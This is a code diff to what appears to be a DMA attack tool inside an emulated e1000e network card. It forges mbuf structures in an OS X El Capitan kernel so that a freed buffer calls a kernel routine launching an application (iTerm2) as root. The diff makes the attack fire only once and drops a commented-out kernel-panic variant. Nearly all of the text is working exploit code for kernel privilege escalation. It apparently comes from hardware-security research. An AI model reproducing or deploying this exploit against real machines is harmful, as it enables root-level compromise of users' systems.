@@ -761,7 +761,6 @@ subvert_mbuf(struct mbuf *mbuf, uint64_t kernel_mbuf_addr)
 	mbuf->MM_NEXTPKT = NULL;
 	mbuf->MM_EXT.ext_refflags = kernel_mbuf_addr + MBUF_EMPTY_OFFSET;
 	mbuf->MM_EXT.ext_free = EL_CAPITAN_KUNC_EXECUTE;
-	/*mbuf->MM_EXT.ext_free = EL_CAPITAN_PANIC;*/
 	mbuf->MM_EXT.ext_buf = kernel_mbuf_addr + offsetof(struct mbuf, MM_PKTHDR);
 	mbuf->MM_EXT.ext_size = kOpenAppAsRoot;
 	mbuf->MM_EXT.ext_arg = kOpenApplicationPath;
@@ -770,14 +769,15 @@ subvert_mbuf(struct mbuf *mbuf, uint64_t kernel_mbuf_addr)
 	flags = refcount + 1;
 	*flags = 0;
 	chars = (char *)(&mbuf->MM_PKTHDR);
-	strcpy(chars, "/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal");
-	/*strcpy(chars, "at th disco");*/
+	strcpy(chars, "/Applications/iTerm.app/Contents/MacOS/iTerm2");
 }
+
+static bool DONE = false;
 
 void
 attack_el_capitan(E1000ECore* core, ConstDescriptorP desc)
 {
-	if (desc->buffer_addr % MCLBYTES == 0) {
+	if (desc->buffer_addr % MCLBYTES == 0 || DONE) {
 		return;
 	}
 	hwaddr page_addr = page_base_address(desc->buffer_addr);
@@ -810,11 +810,13 @@ attack_el_capitan(E1000ECore* core, ConstDescriptorP desc)
 			continue;
 		}
 		putchar('s');
+		DONE = true;
 		kernel_mbuf_address = kernel_page_address + (i * sizeof(struct mbuf));
 		subvert_mbuf(&mbufs[i], kernel_mbuf_address);
 		endianness_swap_mac_mbuf_header(&mbufs[i]);
 		perform_dma_write((uint8_t *)&mbufs[i], 256,
 			core->owner->devfn, 8, mbuf_address);
+		return;
 	}
 }
 
